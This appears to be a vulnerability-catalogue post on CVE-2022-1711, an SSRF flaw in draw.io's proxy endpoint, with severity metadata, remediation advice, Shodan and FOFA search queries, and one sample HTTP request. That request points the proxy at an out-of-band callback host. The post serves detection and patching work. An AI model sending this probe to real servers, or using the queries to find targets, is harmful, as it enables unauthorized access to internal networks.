---
layout: post
cve_id: CVE-2022-1711
title: draw.io < 18.0.5 - Server Side Request Forgery (SSRF)
pcap: true
pcap_path: /pcaps/2022/CVE-2022-1711.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-1711.yaml
snort2_rule: N/A
snort3_rule: N/A
author: ritikchaddha
severity: high
impact: 'Unauthenticated attackers can perform SSRF attacks via the proxy endpoint
  to access internal resources, scan internal networks, or retrieve sensitive data
  from internal systems.

  '
remediation: 'Update to draw.io/diagrams.net version 18.0.5 or later. The patch adds
  isLinkLocalAddress() checks to restrict proxy request destinations. If patching
  isn''t possible, implement network controls to limit server connections to internal
  systems.

  '
reference:
- https://huntr.dev/bounties/c32afff5-6ad5-4d4d-beea-f55ab4925797
- https://github.com/jgraph/drawio/commit/cf5c78aa0f3127fb10053db55b39f3017a0654ae
- https://nvd.nist.gov/vuln/detail/CVE-2022-1711
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 7.5
  cve-id: CVE-2022-1711
  cwe-id: CWE-918
  epss-score: 0.30074
  epss-percentile: 0.96506
metadata:
  vendor: diagrams
  product: drawio
  verified: true
  shodan-query: html:"draw.io"
  fofa-query: body="draw.io"
tags:
- cve
- cve2022
- ssrf
- drawio
- diagrams
- jgraph
- vuln
---

## ðŸ” Vulnerability Description
Server-Side Request Forgery (SSRF) vulnerability in draw.io (also known as diagrams.net) prior to version 18.0.5 allows attackers to bypass URL validation restrictions in the ProxyServlet component. The vulnerability exists because the application does not properly validate URLs passed to its proxy endpoint, allowing attackers to make requests to internal services or external servers. This can lead to unauthorized access to internal resources and potential data exfiltration.


## ðŸŒ HTTP Request
```nohighlight
GET /proxy?url=http://d5jm0thle0o3814s9j4gh6jy3s4n6ih7f.oast.site HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.6.20) Gecko/ Firefox/3.6.5
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

